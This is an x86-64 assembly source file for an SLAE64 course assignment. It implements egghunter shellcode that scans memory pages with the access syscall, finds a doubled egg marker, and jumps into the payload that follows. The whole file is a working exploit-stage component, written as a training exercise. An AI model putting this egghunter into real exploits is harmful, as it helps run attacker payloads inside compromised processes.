; SLAE64 assignment 3
; by Jasper Lievisse Adriaanse
; Student ID: SLAE64-1614
global _start

section .text

_start:
	xor rdx, rdx

next_page:
	or dx, 0xfff	; prevent any NULLs when encoding 4096 bytes for PAGE_SIZE (0xfff = 4095)

next_address:
	inc rdx		; increment rdx to get the next valid page

egghunter:
	; Use the access(2) syscall to poke memory, if it returns EFAULT
	; we know this particular page isn't mapped or we're not allowed
	; to access it. In that case we move on to the next page.
	; Otherwise we compare the first dword with our marker.
	; syscall:
	;	access: 21 on Linux/x86_64
	; arguments:
	;	%rdi: address to check
	;	%rsi: F_OK (meaning the page "exists")
	; return value:
	;	%rax: EFAULT in case the page doesn't exit; 0 otherwise.
	lea rdi, [rdx+8]
	xor rax, rax
	push rax
	push 21
	pop rax
	pop rsi
	syscall

	; Now compare the return value in %rax with EFAULT (0xf2)
	cmp al, 0xf2

	; If they match move to the next page.
	jz next_page

	; Otherwise move our egg into rax for comparison
	mov rax, 0x50905090

	; Setup %rdi for next scasc call which expects it's operands in %rax and %rdi
	mov rdi, rdx
	scasd

	; Move the next address no match
	jnz next_address

	; Otherwise test again as we may have run into our own egg encoded above
	scasd

	; Again, move to the next address if there's no match this time
	jnz next_address

	; If we got here, we have found our payload. So jump right to into it!
	jmp rdi
